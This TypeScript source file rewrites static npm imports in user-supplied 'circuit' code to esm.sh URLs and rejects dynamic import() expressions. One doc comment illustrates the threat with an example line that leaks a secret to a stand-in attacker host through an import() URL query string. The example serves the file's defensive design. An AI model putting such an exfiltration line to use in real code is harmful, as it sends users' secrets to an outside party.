/**
 * Import rewriter for npm package support in circuit code.
 *
 * Extracts static import statements from JS code, rewrites bare npm specifiers
 * to esm.sh CDN URLs, and produces a loader ES module that can be dynamically
 * imported so the resolved values can be injected into the executeJsCode scope.
 *
 * @simten/* imports are silently skipped — those names are already in scope
 * via getScope() and don't need to be loaded from the network.
 */

export interface ExtractedImports {
  /** ES module string that imports from esm.sh and re-exports by local name */
  loaderModule: string;
  /** Local binding names re-exported by the loader module */
  localNames: string[];
  /** Source with all import statements removed */
  codeWithoutImports: string;
}

interface ParsedImport {
  raw: string;
  specifier: string;
  /** Everything between 'import' and 'from', null for side-effect imports */
  bindingsPart: string | null;
  localNames: string[];
}

// ── Detection ──────────────────────────────────────────────────────────────

/** Returns true if the JS source contains any static import statements. */
export function hasImportStatements(jsCode: string): boolean {
  return /^\s*import\s/m.test(jsCode);
}

/**
 * Returns true if the JS source contains a dynamic `import()` expression.
 *
 * Why we forbid these: dynamic `import()` is governed by CSP `script-src`, not
 * `connect-src`. With our current CSP only restricting `connect-src`, a user
 * circuit containing `await import('https://attacker.example/?leak=' + secret)`
 * would fire the request unchecked — the URL itself is an exfiltration channel
 * (the attacker logs the query string; the response need not even be a valid
 * module). The rewriter only rewrites *static* `import` statements; leaving
 * `import()` to pass through is the bug.
 *
 * Circuit code is data-flow definition — there is no legitimate need to lazily
 * load modules at runtime. Static imports cover the entire real use case
 * (importing a hash lib as a Tier-A oracle, importing fast-check, etc).
 * Rejecting at compile time is the right tradeoff. Revisit if a real workflow
 * surfaces.
 *
 * Detection is a regex over the raw source — it matches `import(` inside
 * string literals or comments too. Both are exceedingly rare in circuit code
 * (no template strings building source code); the false-positive cost is a
 * clear compile error, not a silent miscompile.
 */
export function containsDynamicImport(jsCode: string): boolean {
  return /\bimport\s*\(/.test(jsCode);
}

// ── Specifier helpers ──────────────────────────────────────────────────────

function isSimtenSpecifier(specifier: string): boolean {
  return specifier.startsWith('@simten/');
}

function rewriteSpecifier(specifier: string): string {
  if (specifier.startsWith('https://') || specifier.startsWith('http://')) return specifier;
  if (specifier.startsWith('.') || specifier.startsWith('/')) return specifier;
  return `https://esm.sh/${specifier}`;
}

// ── Binding name extraction ────────────────────────────────────────────────

/**
 * Extract local variable names from the bindings portion of an import statement.
 * e.g. "fc" → ["fc"], "{ foo, bar as baz }" → ["foo", "baz"], "* as ns" → ["ns"]
 */
function extractLocalNames(bindingsPart: string): string[] {
  const trimmed = bindingsPart.trim();
  const names: string[] = [];

  // Namespace: * as foo
  const nsMatch = trimmed.match(/^\*\s+as\s+(\w+)$/);
  if (nsMatch) return [nsMatch[1]];

  // Extract named block { ... }
  const namedBlockMatch = trimmed.match(/\{([\s\S]*?)\}/);
  if (namedBlockMatch) {
    const namedNames = namedBlockMatch[1]
      .split(',')
      .map(s => s.trim())
      .filter(Boolean)
      .map(s => {
        const asMatch = s.match(/\bas\s+(\w+)/);
        return asMatch ? asMatch[1] : (s.match(/^(\w+)/) ?? [])[1] ?? '';
      })
      .filter(n => n && /^\w+$/.test(n));
    names.push(...namedNames);
  }

  // Default import: identifier before any comma, not { or *
  const withoutNamed = trimmed.replace(/\{[\s\S]*?\}/, '').replace(/,/g, '').trim();
  if (withoutNamed && withoutNamed !== '*') {
    const defaultMatch = withoutNamed.match(/^(\w+)$/);
    if (defaultMatch) names.push(defaultMatch[1]);
  }

  return names;
}

// ── Import statement parsing ───────────────────────────────────────────────

/**
 * Parse all static import statements from JS code.
 * Handles single-line and multi-line imports, skips dynamic import().
 */
function parseImports(jsCode: string): ParsedImport[] {
  const results: ParsedImport[] = [];
  const lines = jsCode.split('\n');
  let i = 0;

  while (i < lines.length) {
    const trimmed = lines[i].trimStart();
    // Must start with 'import' keyword
    if (!trimmed.startsWith('import ') && !trimmed.startsWith("import'") && !trimmed.startsWith('import"')) {
      i++;
      continue;
    }
    // Skip dynamic import() expressions
    if (/^import\s*\(/.test(trimmed)) {
      i++;
      continue;
    }

    // Accumulate lines until we can extract the specifier
    let raw = lines[i];
    let found = false;

    for (let j = i; j < Math.min(i + 20, lines.length); j++) {
      if (j > i) raw += '\n' + lines[j];

      // Try full import with 'from':  import [bindings] from 'specifier'
      const fromMatch = raw.match(/\bfrom\s+(['"])([^'"]+)\1\s*;?\s*$/);
      if (fromMatch) {
        const specifier = fromMatch[2];
        // Bindings part: everything between 'import ' and ' from'
        const bindingsPart = raw
          .replace(/^[ \t]*import\s+/, '')
          .replace(/\s*\bfrom\s+(['"])[^'"]+\1\s*;?\s*$/, '')
          .trim() || null;
        const localNames = bindingsPart ? extractLocalNames(bindingsPart) : [];
        results.push({ raw, specifier, bindingsPart, localNames });
        i = j + 1;
        found = true;
        break;
      }

      // Side-effect import: import 'specifier'
      const sideEffectMatch = raw.match(/^[ \t]*import\s+(['"])([^'"]+)\1\s*;?\s*$/);
      if (sideEffectMatch) {
        results.push({ raw, specifier: sideEffectMatch[2], bindingsPart: null, localNames: [] });
        i = j + 1;
        found = true;
        break;
      }
    }

    if (!found) i++;
  }

  return results;
}

// ── Public API ─────────────────────────────────────────────────────────────

/**
 * Extract static imports from JS code, rewrite npm specifiers to esm.sh,
 * and return a loader module that re-exports all imported names.
 *
 * The returned loaderModule can be blob-URL imported to resolve the packages,
 * and the returned localNames tell you which exports to read back.
 */
export function extractAndRewriteImports(jsCode: string): ExtractedImports {
  const imports = parseImports(jsCode);
  const loaderLines: string[] = [];
  const allLocalNames: string[] = [];
  let codeWithoutImports = jsCode;

  for (const imp of imports) {
    // Remove the import statement from the code (first occurrence only)
    codeWithoutImports = codeWithoutImports.replace(imp.raw, '');

    // @simten/* is already in scope — skip (don't add to loader module)
    if (isSimtenSpecifier(imp.specifier)) continue;

    const url = rewriteSpecifier(imp.specifier);

    // Reconstruct the import statement with the rewritten URL
    const rewritten = imp.raw.replace(
      /(['"])[^'"]+\1(\s*;?\s*)$/,
      `'${url}'$2`,
    );
    loaderLines.push(rewritten.trim());
    allLocalNames.push(...imp.localNames);
  }

  // Re-export all collected local names so they're accessible after import()
  loaderLines.push(allLocalNames.length > 0
    ? `export { ${allLocalNames.join(', ')} };`
    : 'export {};',
  );

  return {
    loaderModule: loaderLines.join('\n'),
    localNames: allLocalNames,
    codeWithoutImports: codeWithoutImports.trim(),
  };
}
